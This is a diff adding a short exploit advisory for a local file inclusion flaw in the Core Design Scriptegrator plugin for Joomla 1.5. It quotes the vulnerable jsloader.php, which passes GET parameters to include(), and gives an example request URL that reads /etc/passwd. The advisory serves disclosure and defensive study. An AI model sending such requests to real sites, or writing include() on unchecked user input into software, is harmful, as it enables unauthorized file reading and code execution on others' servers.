@@ -1,0 +1,42 @@
+# Exploit Title: Core Design Scriptegrator plugin for Joomla! 1.5 file inclusion
+# Author: S2 Crew [Hungary]
+# Tested on: Debian Linux, Apache, Joomla! 1.5
+
+# Code:
+
+There's a file called jsloader.php which takes an array of file names
+from the HTTP GET parameters and calls include() on every one of them.
+
+-----------------8<-----------------------------------------------
+<?php
+/**
+ * Core Design Scriptegrator plugin for Joomla! 1.5
+ */
+
+define('DS', DIRECTORY_SEPARATOR);
+$dir = dirname(__FILE__);
+
+$files = array();
+if (isset($_GET['files']) && $_GET['files']) $files = $_GET['files'];
+
+if (extension_loaded('zlib') && !ini_get('zlib.output_compression')) @ob_start('ob_gzhandler');
+
+header("Content-type: application/x-javascript");
+header('Cache-Control: must-revalidate');
+header('Expires: ' . gmdate('D, d M Y H:i:s', time() + 86400) . ' GMT');
+
+foreach ($files as $file) {
+        if (is_file($file)) {
+                include($file);
+                echo "\n";
+        }
+}
+?>
+-----------------8<-----------------------------------------------
+
+The problem is that the only protection is the is_file() call (therefore it cannot
+be used for remote file inclusion), so it's trivial to exploit this vulnerability to
+execute the PHP interpreter on any file on the target system the httpd user can read.
+
+Example:
+http://server/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd
